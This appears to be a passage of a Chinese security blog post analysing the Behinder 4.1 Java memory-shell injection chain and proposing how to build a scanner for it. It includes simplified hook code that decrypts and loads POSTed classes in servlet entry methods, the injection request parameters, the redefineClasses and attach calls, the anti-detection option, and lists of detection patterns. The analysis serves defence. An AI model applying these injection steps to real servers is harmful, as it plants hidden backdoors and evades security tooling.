+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">原始 classBody<br>-&gt; Base64 解码<br>-&gt; Javassist 加载 CtClass<br>-&gt; 找 service() / execute()<br>-&gt; insertBefore(shellCodeWithDecrypt)<br>-&gt; CtClass.toBytecode()<br>-&gt; Base64 编码成新的 classBody<br></code></pre></td></tr></table></figure>
+
+<p>所以扫描时没必要只盯着 <code>classBody</code> 这个参数本身。真正要抓的是：入口方法里有没有多出这种动态加载和解密执行的字节码模式。</p>
+<h3 id="3-2-具体-Hook-哪些方法"><a href="#3-2-具体-Hook-哪些方法" class="headerlink" title="3.2 具体 Hook 哪些方法"></a>3.2 具体 Hook 哪些方法</h3><p>客户端里有一张目标类到方法的映射表。</p>
+<p>整理出来大概是这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">targetClasses.put(<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>, &#123;<br>    methodName: <span class="hljs-string">&quot;service&quot;</span>,<br>    paramList: [<br>        <span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span>,<br>        <span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span><br>    ]<br>&#125;);<br><br>targetClasses.put(<span class="hljs-string">&quot;jakarta.servlet.http.HttpServlet&quot;</span>, &#123;<br>    methodName: <span class="hljs-string">&quot;service&quot;</span>,<br>    paramList: [<br>        <span class="hljs-string">&quot;jakarta.servlet.ServletRequest&quot;</span>,<br>        <span class="hljs-string">&quot;jakarta.servlet.ServletResponse&quot;</span><br>    ]<br>&#125;);<br><br>targetClasses.put(<span class="hljs-string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span>, &#123;<br>    methodName: <span class="hljs-string">&quot;execute&quot;</span>,<br>    paramList: [<br>        <span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span>,<br>        <span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span><br>    ]<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>所以最后被塞逻辑的地方就两个方向：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">HttpServlet.service(...)<br>ServletStubImpl.execute(...)<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-3-插入进去的逻辑长什么样"><a href="#3-3-插入进去的逻辑长什么样" class="headerlink" title="3.3 插入进去的逻辑长什么样"></a>3.3 插入进去的逻辑长什么样</h3><p><code>Constants.shellCodeWithDecrypt</code> 展开以后，大概就是在入口方法前面加了这么一段判断：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (request.getRequestURI().matches(pathPattern)) &#123;<br>    <span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>)) &#123;<br>        <span class="hljs-type">byte</span>[] requestBody = readRequestBody(request);<br><br>        <span class="hljs-type">byte</span>[] decryptBytes = base64Decode(decryptClass);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">decryptCls</span> <span class="hljs-operator">=</span> defineClass(decryptBytes);<br><br>        <span class="hljs-type">byte</span>[] payloadBytes = decrypt(requestBody);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">payloadCls</span> <span class="hljs-operator">=</span> defineClass(payloadBytes);<br><br>        payloadCls.newInstance().equals(obj);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>obj</code> 里放的是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">request<br>response<br>session<br></code></pre></td></tr></table></figure>
+
+<p>运行期真正触发时，链路差不多是这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /memshell<br>-&gt; 进入被 Hook 的 service() / execute()<br>-&gt; 匹配路径<br>-&gt; 读取请求体<br>-&gt; 加载解密类<br>-&gt; 解密 payload<br>-&gt; defineClass 动态加载<br>-&gt; equals(request/response/session) 执行<br></code></pre></td></tr></table></figure>
+
+<h2 id="4-注入层：AgentNoFile-与-Agent-两条路径"><a href="#4-注入层：AgentNoFile-与-Agent-两条路径" class="headerlink" title="4. 注入层：AgentNoFile 与 Agent 两条路径"></a>4. 注入层：AgentNoFile 与 Agent 两条路径</h2><p>到这里，Hook 版字节码已经准备好了。接下来分成两条路：一种尽量不落地 Agent 文件，另一种生成并上传一个定制 Agent Jar。</p>
+<h3 id="4-1-AgentNoFile-无文件注入"><a href="#4-1-AgentNoFile-无文件注入" class="headerlink" title="4.1 AgentNoFile 无文件注入"></a>4.1 AgentNoFile 无文件注入</h3><p><code>AgentNoFile</code> 这条路的特点，是尽量不在目标上落一个 Agent Jar。</p>
+<p>前面客户端已经把入口类改成了 Hook 版，接下来会把类名和新的字节码一起发过去：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">shellService.injectAgentNoFileMemShell(<br>    className,<br>    newClassBody,<br>    antiAgent<br>);<br></code></pre></td></tr></table></figure>
+
+<p>请求里主要带这几个值：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">action=injectAgentNoFile<br>className=javax.servlet.http.HttpServlet<br>classBody=修改后的字节码 Base64<br>antiAgent=true/false<br></code></pre></td></tr></table></figure>
+
+<p>目标端看到 <code>action=injectAgentNoFile</code> 后，会进入这个分支：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;injectAgentNoFile&quot;</span>.equals(action)) &#123;<br>    enableAttachSelf();<br><br>    doInjectAgentNoFile(<br>        className,<br>        base64decode(classBody),<br>        Boolean.parseBoolean(antiAgent)<br>    );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>再往下会按操作系统拆分处理：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br><br><span class="hljs-keyword">if</span> (os.contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>    agentForWindow(className, classBytes, antiAgent);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (os.contains(<span class="hljs-string">&quot;mac&quot;</span>)) &#123;<br>    <span class="hljs-comment">// 支持不完整</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    agentForLinux(className, classBytes, antiAgent);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这条路之所以值得重点盯，是因为它会碰到这些比较敏感的东西：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">sun.misc.Unsafe<br>sun.instrument.InstrumentationImpl<br>ClassDefinition<br>redefineClasses<br></code></pre></td></tr></table></figure>
+
+<p>如果是 Linux，痕迹还会更明显一些，会碰到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">/proc/self/maps<br>/proc/self/mem<br>libjava.so<br>libjvm.so<br>JNI_GetCreatedJavaVMs<br></code></pre></td></tr></table></figure>
+
+<p>但不管中间怎么绕，最后还是为了调用这一步：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassDefinition</span> <span class="hljs-variable">definition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassDefinition</span>(<br>    Class.forName(className),<br>    modifiedClassBytes<br>);<br><br>instrumentation.redefineClasses(definition);<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-2-Agent-落地-Jar-注入"><a href="#4-2-Agent-落地-Jar-注入" class="headerlink" title="4.2 Agent 落地 Jar 注入"></a>4.2 Agent 落地 Jar 注入</h3><p><code>Agent</code> 分支就更传统一点：先做一个定制过的 Agent Jar，再让目标 JVM 自己把它加载起来。</p>
+<p>客户端会先准备一个远程临时路径。</p>
+<p>Windows 类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">c:/windows/temp/&#123;random&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Linux 类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">/tmp/&#123;random&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接着从内置资源里选一个 Agent 模板：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">net/rebeyond/behinder/resource/tools/tools_0.jar<br>net/rebeyond/behinder/resource/tools/tools_1.jar<br>net/rebeyond/behinder/resource/tools/tools_2.jar<br>net/rebeyond/behinder/resource/tools/tools_3.jar<br></code></pre></td></tr></table></figure>
+
+<p>生成定制 Jar 的入口是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">personalizedAgentJar(<br>    templateJarPath,<br>    memshellPath,<br>    decryptClassBase64,<br>    <span class="hljs-string">&quot;Decrypt&quot;</span><br>);<br></code></pre></td></tr></table></figure>
+
+<p>这个方法会先把这些参数准备好：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">params.put(<span class="hljs-string">&quot;path&quot;</span>, memshellPath);<br>params.put(<span class="hljs-string">&quot;decryptClassStr&quot;</span>, decryptClassBase64);<br>params.put(<span class="hljs-string">&quot;decryptName&quot;</span>, <span class="hljs-string">&quot;Decrypt&quot;</span>);<br>params.put(<span class="hljs-string">&quot;shellCode&quot;</span>, Constants.shellCodeWithDecrypt);<br></code></pre></td></tr></table></figure>
+
+<p>然后读取模板里的这个类：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">net/rebeyond/behinder/resource/tools/MemShell.class<br></code></pre></td></tr></table></figure>
+
+<p>然后通过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Params.getParamedClass(...)<br></code></pre></td></tr></table></figure>
+
+<p>再把路径、解密类、待插入代码这些内容写进 Agent 内部的 <code>MemShell.class</code> 静态字段。</p>
+<p>接着重新打包 Jar：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">替换 Agent Jar 内部 MemShell.class<br>修改 META-INF/MANIFEST.MF 中的 Agent-Class<br></code></pre></td></tr></table></figure>
+
+<p>Jar 准备好以后，再上传到目标：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">shellService.uploadFile(remotePath, personalizedJarBytes, <span class="hljs-literal">true</span>);<br>shellService.loadJar(remotePath);<br></code></pre></td></tr></table></figure>
+
+<p>目标端收到的注入参数大概是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">action=injectAgent<br>libPath=remotePath<br>path=memshellPath<br>password=passwordKey<br>antiAgent=<span class="hljs-literal">true</span>/<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+
+<p>真正加载 Agent 的地方，走的是 attach API：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">enableAttachSelf();<br><br>Class&lt;?&gt; vmClass = ClassLoader<br>    .getSystemClassLoader()<br>    .loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attachMethod.invoke(<span class="hljs-literal">null</span>, getCurrentPID());<br><br>loadAgentMethod.invoke(vm, libPath);<br></code></pre></td></tr></table></figure>
+
+<p>也就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">VirtualMachine.attach(当前 JVM)<br>-&gt; loadAgent(libPath)<br>-&gt; agentmain 获取 Instrumentation<br>-&gt; redefineClasses 修改请求入口类<br></code></pre></td></tr></table></figure>
+
+<h2 id="5-注入流程图"><a href="#5-注入流程图" class="headerlink" title="5. 注入流程图"></a>5. 注入流程图</h2><pre><code class=" mermaid">flowchart TD
+    A[&quot;冰蝎客户端&lt;br/&gt;点击注入内存马&quot;] --&gt; B[&quot;getMemShellTargetClass()&quot;]
+    B --&gt; C[&quot;目标端 MemShell&lt;br/&gt;action=get&quot;]
+
+    C --&gt; D&#123;&quot;探测目标 JVM 请求入口类&quot;&#125;
+    D --&gt; D1[&quot;weblogic.servlet.internal.ServletStubImpl&quot;]
+    D --&gt; D2[&quot;jakarta.servlet.http.HttpServlet&quot;]
+    D --&gt; D3[&quot;javax.servlet.http.HttpServlet&quot;]
+
+    D1 --&gt; E[&quot;返回原始 className + classBody&quot;]
+    D2 --&gt; E
+    D3 --&gt; E
+
+    E --&gt; F&#123;&quot;注入类型&quot;&#125;
+
+    F --&gt; G[&quot;AgentNoFile&quot;]
+    F --&gt; H[&quot;Agent&quot;]
+
+    G --&gt; G1[&quot;Base64 解码原始 classBody&quot;]
+    G1 --&gt; G2[&quot;Javassist 加载 CtClass&quot;]
+    G2 --&gt; G3[&quot;定位 service() / execute()&quot;]
+    G3 --&gt; G4[&quot;insertBefore(shellCodeWithDecrypt)&quot;]
+    G4 --&gt; G5[&quot;toBytecode() 生成替换字节码&quot;]
+    G5 --&gt; G6[&quot;发送 action=injectAgentNoFile&quot;]
+    G6 --&gt; G7[&quot;Unsafe / InstrumentationImpl&quot;]
+    G7 --&gt; Z[&quot;Instrumentation.redefineClasses()&quot;]
+
+    H --&gt; H1[&quot;生成个性化 Agent Jar&quot;]
+    H1 --&gt; H2[&quot;上传目标临时目录&quot;]
+    H2 --&gt; H3[&quot;VirtualMachine.attach 当前 JVM&quot;]
+    H3 --&gt; H4[&quot;loadAgent(libPath)&quot;]
+    H4 --&gt; H5[&quot;Agent 获取 Instrumentation&quot;]
+    H5 --&gt; Z
+
+    Z --&gt; I[&quot;替换目标 JVM 已加载类&quot;]
+    I --&gt; J[&quot;HttpServlet.service()&lt;br/&gt;或 ServletStubImpl.execute() 被插入 Hook&quot;]
+    J --&gt; K[&quot;POST 注入路径&quot;]
+    K --&gt; L[&quot;解密 payload&quot;]
+    L --&gt; M[&quot;defineClass 动态加载&quot;]
+    M --&gt; N[&quot;equals(request/response/session) 执行&quot;]
+</code></pre>
+
+<h2 id="6-防检测-antiAgent"><a href="#6-防检测-antiAgent" class="headerlink" title="6. 防检测 antiAgent"></a>6. 防检测 antiAgent</h2><p>前端“防检测”对应参数：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">antiAgent<br></code></pre></td></tr></table></figure>
+
+<p>它不是 Web 流量层面的隐藏，而是偏向：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">反 Java Agent 查杀<br>反后续 attach<br>反后续查杀插件注入<br></code></pre></td></tr></table></figure>
+
+<p>它带来的一个直接影响是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">当前注入成功后，容器重启前可能无法再次通过同类方式注入<br></code></pre></td></tr></table></figure>
+
+<p>所以防护侧不能太依赖 Agent 文件或 Agent 列表。开启防检测后，这些痕迹可能被清理，也可能被干扰。</p>
+<p>更值得盯的还是这些位置：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">HttpServlet / ServletStubImpl 是否被 redefine<br>service() / execute() 字节码是否异常<br>JVM 是否访问 /proc/self/mem<br>是否出现 Unsafe / InstrumentationImpl / ClassDefinition<br></code></pre></td></tr></table></figure>
+
+<h2 id="7-扫描工具可以怎么落地"><a href="#7-扫描工具可以怎么落地" class="headerlink" title="7. 扫描工具可以怎么落地"></a>7. 扫描工具可以怎么落地</h2><p>看到这里，工具思路其实就比较清楚了：别一上来就满 JVM 乱扫，先把几个最容易被改的入口盯住。</p>
+<p>从零开始做的话，可以先记录一份“干净状态”。应用刚启动、业务还没被打过的时候，先把这些东西存下来：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">Filter 列表<br>Servlet 映射<br>Listener 列表<br>Spring HandlerMapping<br>HttpServlet.service 字节码 hash<br>ServletStubImpl.execute 字节码 hash<br></code></pre></td></tr></table></figure>
+
+<p>这里面最容易被忽略的，其实是后面两个 hash。</p>
+<p>因为冰蝎这条链不是一定新注册一个组件，它可以直接把已经加载的入口类改掉。你只看 Web 组件列表，很可能什么都看不出来。</p>
+<p>第二步，把扫描范围先收窄到这几个类：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">javax.servlet.http.HttpServlet<br>jakarta.servlet.http.HttpServlet<br>weblogic.servlet.internal.ServletStubImpl<br></code></pre></td></tr></table></figure>
+
+<p>拿到类字节码以后，不是简单看有没有某个字符串，而是看一组特征是不是扎堆出现。比如：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">getRequestURI<br>matches<br>POST<br>getInputStream<br>Base64<br>ClassLoader#defineClass<br>SecureClassLoader<br>setAccessible(true)<br>newInstance<br>equals<br>request / response / session<br></code></pre></td></tr></table></figure>
+
+<p>单个特征不一定能定性。比如业务代码里也可能有 Base64，也可能有反射。</p>
+<p>但如果这些东西同时出现在 <code>HttpServlet.service()</code> 或 <code>ServletStubImpl.execute()</code> 这种入口方法里，那味道就不对了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">判断路径<br>只处理 POST<br>读取请求体<br>Base64 / AES 解密<br>defineClass 动态加载<br>newInstance + equals 执行<br></code></pre></td></tr></table></figure>
+
+<p>这几个动作连在一起，基本就是“请求进来以后现场解密并加载 class”的链路。</p>
+<p>第三步才是拦截。优先卡这些动作：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Instrumentation.redefineClasses<br>VirtualMachine.attach<br>loadAgent<br>ClassLoader#defineClass<br>/proc/self/mem<br></code></pre></td></tr></table></figure>
+
+<p>这里面最敏感的是 <code>redefineClasses</code>。尤其是下面这种情况，基本可以直接打高危告警：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">redefineClasses(javax.servlet.http.HttpServlet)<br>redefineClasses(jakarta.servlet.http.HttpServlet)<br>redefineClasses(weblogic.servlet.internal.ServletStubImpl)<br></code></pre></td></tr></table></figure>
+
+<p>如果再叠加这些现象，就不太适合再当成普通异常看了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">短时间内出现 attach / loadAgent<br>目标目录出现临时 Jar，随后又被删除<br>Linux 下访问 /proc/self/mem<br>入口类 hash 和启动基线不一致<br>入口方法里出现 defineClass 动态加载链<br></code></pre></td></tr></table></figure>
+
+<p>所以工具一开始没必要喊着“覆盖所有内存马”。这个口子太大，很容易做着做着就失焦。</p>
+<p>更实际的做法，是先把它做成一个专门盯 Agent 型内存马的小工具：谁改了请求入口类、谁拿了 Instrumentation、谁在入口方法里塞了动态类加载逻辑，先把这几件事查准。等这条线稳定了，再慢慢扩到 Filter、Listener、Spring Controller 这些传统内存马类型。</p>
+<h2 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h2><p>把冰蝎 4.1 这条 Java 内存马注入链压缩一下，就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">探测请求入口类<br>-&gt; 取原始 classBody<br>-&gt; 客户端 Javassist 插入 Hook<br>-&gt; 生成替换后字节码<br>-&gt; Agent / AgentNoFile 获取重定义能力<br>-&gt; redefineClasses 替换 JVM 已加载类<br>-&gt; 指定路径 POST 触发后续 payload<br></code></pre></td></tr></table></figure>
+
+<p>所以扫描工具不能只盯新增 Filter。</p>
+<p>最后真正要抓的，还是这几件事：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">请求入口类有没有被改<br>请求入口方法里有没有动态类加载链<br>JVM 有没有发生过敏感 redefine<br></code></pre></td></tr></table></figure>
+
+<p>这才是这类 Agent 型 Java 内存马绕不过去的地方。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">Java代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+        <a href="/tags/%E5%86%B0%E8%9D%8E/" class="print-no-link">#冰蝎</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>冰蝎 4.1 Java 内存马注入链分析</div>
+      <div>https://pwned.icu/2026/06/10/冰蝎4.1-Java内存马注入链分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>m0b1u3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年6月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B1%BB%E5%9E%8B%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%89%AB%E6%8F%8F%E5%88%87%E5%85%A5%E7%82%B9/" title="Java 内存马类型基础与扫描切入点">
+                        <span class="hidden-mobile">Java 内存马类型基础与扫描切入点</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
